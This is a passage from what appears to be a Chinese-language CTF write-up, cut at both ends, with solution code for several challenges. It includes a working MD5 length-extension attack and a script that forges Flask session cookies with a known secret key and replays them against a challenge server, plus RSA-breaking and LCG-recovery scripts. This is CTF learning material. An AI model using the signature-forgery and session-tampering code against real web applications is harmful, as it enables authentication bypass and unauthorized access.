</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5</span>(message: bytes, A: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x67452301</span>, B: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xefcdab89</span>, C: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x98badcfe</span>, D: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10325476</span>) <span style=color:#f92672>-&gt;</span> int:
</span></span><span style=display:flex><span>    message <span style=color:#f92672>=</span> padding_message(message)
</span></span><span style=display:flex><span>    hash_pieces <span style=color:#f92672>=</span> get_init_values(A, B, C, D)[:]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> chunk_ofst <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(message), <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>        a, b, c, d <span style=color:#f92672>=</span> hash_pieces
</span></span><span style=display:flex><span>        chunk <span style=color:#f92672>=</span> message[chunk_ofst:chunk_ofst <span style=color:#f92672>+</span> <span style=color:#ae81ff>64</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>            f <span style=color:#f92672>=</span> functions[i](b, c, d)
</span></span><span style=display:flex><span>            g <span style=color:#f92672>=</span> index_functions[i](i)
</span></span><span style=display:flex><span>            to_rotate <span style=color:#f92672>=</span> a <span style=color:#f92672>+</span> f <span style=color:#f92672>+</span> constants[i] <span style=color:#f92672>+</span> int<span style=color:#f92672>.</span>from_bytes(chunk[<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> g:<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> g <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>], byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)
</span></span><span style=display:flex><span>            new_b <span style=color:#f92672>=</span> (b <span style=color:#f92672>+</span> left_rotate(to_rotate, rotate_amounts[i])) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>            a, b, c, d <span style=color:#f92672>=</span> d, new_b, b, c
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i, val <span style=color:#f92672>in</span> enumerate([a, b, c, d]):
</span></span><span style=display:flex><span>            hash_pieces[i] <span style=color:#f92672>+=</span> val
</span></span><span style=display:flex><span>            hash_pieces[i] <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sum(x <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> i) <span style=color:#66d9ef>for</span> i, x <span style=color:#f92672>in</span> enumerate(hash_pieces))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5_to_hex</span>(digest: int) <span style=color:#f92672>-&gt;</span> str:
</span></span><span style=display:flex><span>    raw <span style=color:#f92672>=</span> digest<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>16</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{:032x}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(int<span style=color:#f92672>.</span>from_bytes(raw, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_md5</span>(message: bytes, A: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x67452301</span>, B: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xefcdab89</span>, C: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x98badcfe</span>, D: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10325476</span>) <span style=color:#f92672>-&gt;</span> str:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> md5_to_hex(md5(message, A, B, C, D))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5_attack</span>(message: bytes, A: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x67452301</span>, B: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xefcdab89</span>, C: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x98badcfe</span>,
</span></span><span style=display:flex><span>               D: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10325476</span>) <span style=color:#f92672>-&gt;</span> int:
</span></span><span style=display:flex><span>    hash_pieces <span style=color:#f92672>=</span> get_init_values(A, B, C, D)[:]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> chunk_ofst <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(message), <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>        a, b, c, d <span style=color:#f92672>=</span> hash_pieces
</span></span><span style=display:flex><span>        chunk <span style=color:#f92672>=</span> message[chunk_ofst:chunk_ofst <span style=color:#f92672>+</span> <span style=color:#ae81ff>64</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>            f <span style=color:#f92672>=</span> functions[i](b, c, d)
</span></span><span style=display:flex><span>            g <span style=color:#f92672>=</span> index_functions[i](i)
</span></span><span style=display:flex><span>            to_rotate <span style=color:#f92672>=</span> a <span style=color:#f92672>+</span> f <span style=color:#f92672>+</span> constants[i] <span style=color:#f92672>+</span> int<span style=color:#f92672>.</span>from_bytes(chunk[<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> g:<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> g <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>], byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)
</span></span><span style=display:flex><span>            new_b <span style=color:#f92672>=</span> (b <span style=color:#f92672>+</span> left_rotate(to_rotate, rotate_amounts[i])) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>            a, b, c, d <span style=color:#f92672>=</span> d, new_b, b, c
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i, val <span style=color:#f92672>in</span> enumerate([a, b, c, d]):
</span></span><span style=display:flex><span>            hash_pieces[i] <span style=color:#f92672>+=</span> val
</span></span><span style=display:flex><span>            hash_pieces[i] <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> sum(x <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> i) <span style=color:#66d9ef>for</span> i, x <span style=color:#f92672>in</span> enumerate(hash_pieces))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_init_values_from_hash_str</span>(real_hash: str) <span style=color:#f92672>-&gt;</span> List[int]:
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Args:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        real_hash: 真实的hash结算结果
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns: 哈希初始化值[A, B, C, D]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    str_list: List[str] <span style=color:#f92672>=</span> [real_hash[i <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:(i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>)]
</span></span><span style=display:flex><span>    <span style=color:#75715e># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [int<span style=color:#f92672>.</span>from_bytes(int(<span style=color:#e6db74>&#39;0x&#39;</span> <span style=color:#f92672>+</span> s, <span style=color:#ae81ff>16</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>4</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>), byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#66d9ef>for</span> s <span style=color:#f92672>in</span> str_list]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_md5_attack_materials</span>(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) <span style=color:#f92672>-&gt;</span> Dict[str, Any]:
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Args:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        origin_msg: 原始的消息字节流
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        key_len: 原始密钥（盐）的长度
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        real_hash: 计算出的真实的hash值
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        append_data: 需要添加的攻击数据
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns: 发起攻击需要的物料信息
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &#39;attack_fake_msg&#39;: bytes([...]),
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &#39;attack_hash_value&#39;: str(a1b2c3d4...)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    init_values <span style=color:#f92672>=</span> get_init_values_from_hash_str(real_hash)
</span></span><span style=display:flex><span>    <span style=color:#75715e># print([&#39;{:08x}&#39;.format(x) for x in init_values])</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span>
</span></span><span style=display:flex><span>    fake_key: bytes <span style=color:#f92672>=</span> bytes([<span style=color:#ae81ff>0xff</span> <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(key_len)])
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算出加了append_data后的真实填充数据</span>
</span></span><span style=display:flex><span>    finally_padded_attack_data <span style=color:#f92672>=</span> padding_message(padding_message(fake_key <span style=color:#f92672>+</span> origin_msg) <span style=color:#f92672>+</span> append_data)
</span></span><span style=display:flex><span>    <span style=color:#75715e># 攻击者提前计算添加了攻击数据的哈希</span>
</span></span><span style=display:flex><span>    attack_hash_value <span style=color:#f92672>=</span> md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key <span style=color:#f92672>+</span> origin_msg)):],
</span></span><span style=display:flex><span>                                              A<span style=color:#f92672>=</span>init_values[<span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>                                              B<span style=color:#f92672>=</span>init_values[<span style=color:#ae81ff>1</span>],
</span></span><span style=display:flex><span>                                              C<span style=color:#f92672>=</span>init_values[<span style=color:#ae81ff>2</span>],
</span></span><span style=display:flex><span>                                              D<span style=color:#f92672>=</span>init_values[<span style=color:#ae81ff>3</span>]))
</span></span><span style=display:flex><span>    fake_padding_data <span style=color:#f92672>=</span> padding_message(fake_key <span style=color:#f92672>+</span> origin_msg)[len(fake_key <span style=color:#f92672>+</span> origin_msg):]
</span></span><span style=display:flex><span>    attack_fake_msg <span style=color:#f92672>=</span> origin_msg <span style=color:#f92672>+</span> fake_padding_data <span style=color:#f92672>+</span> append_data
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#39;attack_fake_msg&#39;</span>: attack_fake_msg, <span style=color:#e6db74>&#39;attack_hash_value&#39;</span>: attack_hash_value}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask.sessions <span style=color:#f92672>import</span> SecureCookieSessionInterface
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span> json<span style=color:#f92672>,</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MockApp</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, secret_key):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> secret_key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>session_decode</span>(session_cookie_value, secret_key):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34; Decode a Flask cookie  &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    app <span style=color:#f92672>=</span> MockApp(secret_key)
</span></span><span style=display:flex><span>    si <span style=color:#f92672>=</span> SecureCookieSessionInterface()
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> si<span style=color:#f92672>.</span>get_signing_serializer(app)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s<span style=color:#f92672>.</span>loads(session_cookie_value)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>session_encode</span>(session_cookie_structure, secret_key):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34; Encode a Flask session cookie &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        app <span style=color:#f92672>=</span> MockApp(secret_key)
</span></span><span style=display:flex><span>        <span style=color:#75715e># session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span>
</span></span><span style=display:flex><span>        si <span style=color:#f92672>=</span> SecureCookieSessionInterface()
</span></span><span style=display:flex><span>        s <span style=color:#f92672>=</span> si<span style=color:#f92672>.</span>get_signing_serializer(app)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> s<span style=color:#f92672>.</span>dumps(session_cookie_structure)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;[Encoding error] </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(e)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>req_index</span>(url, cookie):
</span></span><span style=display:flex><span>    <span style=color:#75715e># headers = {&#34;Cookie&#34;: &#34;session=&#34; + cookie}</span>
</span></span><span style=display:flex><span>    cookies <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;session&#34;</span>:cookie}
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, cookies<span style=color:#f92672>=</span>cookies)<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(r)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;签到成功&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> r:
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(cookie)</span>
</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        req_index(url, cookie)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(r)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>req_user</span>(url):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> json<span style=color:#f92672>.</span>loads(requests<span style=color:#f92672>.</span>get(url)<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>req_login</span>(url):
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;student&#34;</span>, <span style=color:#e6db74>&#34;password&#34;</span>:<span style=color:#e6db74>&#34;student&#34;</span>}
</span></span><span style=display:flex><span>    cookie <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data)<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#34;Set-Cookie&#34;</span>][<span style=color:#ae81ff>8</span>:]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;;&#39;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(cookie)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cookie
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hash_Attack</span>(md5_value, key_len, data, attack_data):
</span></span><span style=display:flex><span>    attack_materials <span style=color:#f92672>=</span> get_md5_attack_materials(data, key_len, md5_value<span style=color:#f92672>.</span>decode(), attack_data)
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(data)</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username&#34;</span>:attack_data, <span style=color:#e6db74>&#34;msg&#34;</span>:attack_materials[<span style=color:#e6db74>&#39;attack_fake_msg&#39;</span>][:<span style=color:#f92672>-</span>len(attack_data)], <span style=color:#e6db74>&#34;sign&#34;</span>:attack_materials[<span style=color:#e6db74>&#39;attack_hash_value&#39;</span>]<span style=color:#f92672>.</span>encode()}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://210.44.150.15:47666/&#34;</span>
</span></span><span style=display:flex><span>    cookie <span style=color:#f92672>=</span> req_login(url<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;login&#39;</span>)
</span></span><span style=display:flex><span>    users <span style=color:#f92672>=</span> req_user(url<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;users&#39;</span>)
</span></span><span style=display:flex><span>    secret_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Th1s_is_5ecr3t_k3y&#34;</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> session_decode(cookie, secret_key)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> user <span style=color:#f92672>in</span> users:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> users[user] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            res <span style=color:#f92672>=</span> hash_Attack(res[<span style=color:#e6db74>&#34;sign&#34;</span>], <span style=color:#ae81ff>16</span>, res[<span style=color:#e6db74>&#34;msg&#34;</span>]<span style=color:#f92672>+</span>res[<span style=color:#e6db74>&#34;username&#34;</span>], user<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>            res2 <span style=color:#f92672>=</span> session_encode(res, secret_key)
</span></span><span style=display:flex><span>            <span style=color:#75715e># time.sleep(1)</span>
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> req_index(url, res2)
</span></span></code></pre></div><p>自己一开始其实已经搓好脚本了，但是一直调用不好，就直接上官p了</p><h2 id=crypto-1>crypto</h2><h3 id=魔鬼的步伐>魔鬼的步伐</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> gcd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pollard_p1</span>(n):
</span></span><span style=display:flex><span>    a <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>100000</span>):
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> pow(a, i, n)
</span></span><span style=display:flex><span>        d <span style=color:#f92672>=</span> gcd(a <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, n)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> d <span style=color:#f92672>&lt;</span> n:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> d
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>2831832791030609530715813213220019883048914189158756797307958158408447051630508377374040550762130532585789257283656903976093710799661936572635199760487152921738463539735395878201301223666364287975878427298711981759489133322514450542491313745324153974993874104970865609328318781784747005428502998650052645698811657</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>277886534227205145921457730106662348869574033254759302593748922500501707927099574576237860088700790266316998558285705873756211980752787668038757766667343292786435728705389634346196021354871807428435121426405798244396230131921055698729045936487882618606410991938850305317286706006559422640483458860444177938881800</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用 Pollard&#39;s p-1 算法来因式分解 n</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> pollard_p1(n)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decrypted flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h3 id=worde很大>worde很大</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> getPrime,long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>130433353485114808362891473473687063450960194937676119243199446452481897128998745221120731419339412044208064119908758711834838645767782724735230587850283436574369664159096103050287644689328716204472869291844135677716993421012781378455475934816332308522080394895659167943720237016096316321598240463439917555281</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>113481028807797740037371035561982400582216347323064462704823511064717743759816353553711535800864287099830079892568173444272959071112043294532294530031945500092151286531985831158853663827132668376187003261937157640029140101561586890243591683063607063713791333133210662159262006241032211052722483961060241094497</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>1052399395403315650954843878395162921915412936034670295881299</span>
</span></span><span style=display:flex><span>dp <span style=color:#f92672>=</span> <span style=color:#ae81ff>10401970562842714823433011053885095731667426359291853822584611025061595365689032401513692452915352091669078429838636807965495759380977994966274049008153199</span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>gcd(pow(a,dp<span style=color:#f92672>*</span>e,n)<span style=color:#f92672>-</span>a,n) 
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c,dp,p)
</span></span><span style=display:flex><span>print(long_to_bytes(m))
</span></span></code></pre></div><h1 id=week3>week3</h1><h2 id=crypto-2>crypto</h2><h3 id=babylcg>babyLCG</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given parameters</span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> <span style=color:#ae81ff>2314263556681405131427434567397721554084880715002737002374447625890031179538396443026861034624920599042538939666756802003</span>
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> <span style=color:#ae81ff>2303270095373091755028150204192621881624870682086240301196159556738806285789162309361059161301421010273000801707364139301</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>1785338523770596929007042881767789771169994055441005505378421343570059111347682949630788644017267333793887728906549496559</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1241585594145948568010297947806690682620161405184519680517131577883608946115221281877403406394716</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>783745699152795646128200231796229145162258118907090494213671524973697625898415316535828899751033</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>244960939438293041293560739941286165510749607918699325252666815425914305519670411696985473344258</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Define the small_roots function</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>small_roots</span>(f, bounds, m<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, d<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> d:
</span></span><span style=display:flex><span>        d <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>degree()
</span></span><span style=display:flex><span>    R <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>base_ring()
</span></span><span style=display:flex><span>    N <span style=color:#f92672>=</span> R<span style=color:#f92672>.</span>cardinality()
</span></span><span style=display:flex><span>    f <span style=color:#f92672>/=</span> f<span style=color:#f92672>.</span>coefficients()<span style=color:#f92672>.</span>pop(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>change_ring(ZZ)
</span></span><span style=display:flex><span>    G <span style=color:#f92672>=</span> Sequence([], f<span style=color:#f92672>.</span>parent())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(m <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        base <span style=color:#f92672>=</span> N <span style=color:#f92672>**</span> (m <span style=color:#f92672>-</span> i) <span style=color:#f92672>*</span> f <span style=color:#f92672>**</span> i
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> shifts <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(range(d), repeat<span style=color:#f92672>=</span>f<span style=color:#f92672>.</span>nvariables()):
